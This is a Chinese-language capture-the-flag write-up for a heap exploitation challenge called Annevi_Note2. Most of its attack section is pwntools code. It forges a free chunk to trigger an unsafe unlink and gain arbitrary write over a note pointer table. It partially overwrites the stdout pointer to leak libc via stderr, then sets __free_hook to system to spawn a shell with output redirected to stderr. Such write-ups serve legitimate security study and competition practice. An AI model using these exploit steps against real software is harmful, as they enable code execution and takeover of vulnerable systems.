# Annevi_Note2

## 题目简述

本题沿用 Annevi Note 的堆菜单和 unsafe unlink 漏洞，但关闭了正常的标准输出，无法直接通过 `show` 泄露 libc。利用分成两段：先用 unlink 改写 Note 指针表，再把 `stdout` 指针的低两字节部分覆盖为 `stderr` 附近，借助仍可用的标准错误泄露 libc；最后覆盖 `__free_hook` 为 `system`，释放保存 `/bin/sh 1>&2` 的块取得 shell。

## 解题过程

先申请四个大小为 `0x90` 的块，最后一块写入命令字符串。释放并重新占用第 0 块，再申请一个 `0x300` 的块，使目标小块保持适合向后合并的布局：

```python
for _ in range(3):
    add(0x90, b"A")
add(0x90, b"/bin/sh 1>&2\x00")

delete(0)
add(0x90, b"B")
add(0x300, b"C")
```

Note 指针表位于 `0x6020e8`。在可溢出的块内伪造空闲块头，把双向链表指针写为：

```python
table = 0x6020E8

fake = flat(
    0,
    0x91,
    table - 0x18,
    table - 0x10,
)
fake += b"\x00" * 0x70
fake += flat(0x90, 0xA0)

edit(1, fake)
delete(2)
```

`delete(2)` 触发向前合并时，glibc 执行 unlink。通过 `FD->bk = BK` 和 `BK->fd = FD`，指针表中某一项被改为指向表本身附近，后续 `edit` 因而获得任意地址写。再重排表项：

```python
layout = b"\x00" * 0x18
layout += p64(0x6020A0)
layout += p64(0x6020E0)
edit(1, layout)
```

程序没有正常 stdout，但 stderr 仍连接远端。官方 libc 布局下，部分覆盖 `stdout` 指针的低两字节为 `0x2540`，可令它落到 `_IO_2_1_stderr_`：

```python
edit(1, b"\x40\x25")
show(1)

io.recvuntil(b"content:")
stderr_addr = u64(io.recvn(6).ljust(8, b"\x00"))
libc.address = stderr_addr - libc.sym["_IO_2_1_stderr_"]
```

ASLR 使两个对象地址的高半字节关系并非每次都相同，这个低位覆盖大约需要按连接重试，官方解法给出的成功概率为 $1/16$。`0x2540` 也与指定 libc 绑定，远程 libc 不同时必须重新计算，不能当作通用常量。

有 libc 基址后，把一个表项改为 `__free_hook`，再修复三个标准流指针，最后通过任意写把 hook 改成 `system`：

```python
edit(2, p64(libc.sym["__free_hook"]))

edit(1, flat(
    libc.sym["_IO_2_1_stdout_"],
    0,
    libc.sym["_IO_2_1_stdin_"],
))

edit(0, p64(libc.sym["system"]))
delete(3)
io.interactive()
```

第 3 块的内容是 `/bin/sh 1>&2`，因此释放时实际调用 `system("/bin/sh 1>&2")`。`1>&2` 把新 shell 的输出导向尚未关闭的 stderr，解决了题目刻意破坏 stdout 后看不到回显的问题。

## 方法总结

- unsafe unlink 只负责把堆块写能力转化为指针表改写；泄露 libc 和取得代码执行仍需分别设计。
- 当标准输出不可用时，应检查 stderr、FILE 指针、网络文件描述符等剩余通道；本题通过低位覆盖复用了 stderr。
- 利用依赖指定 libc、全局表地址和概率性部分覆盖。复现脚本应在失败时重连，并对泄露地址和 libc 偏移做合理性检查。
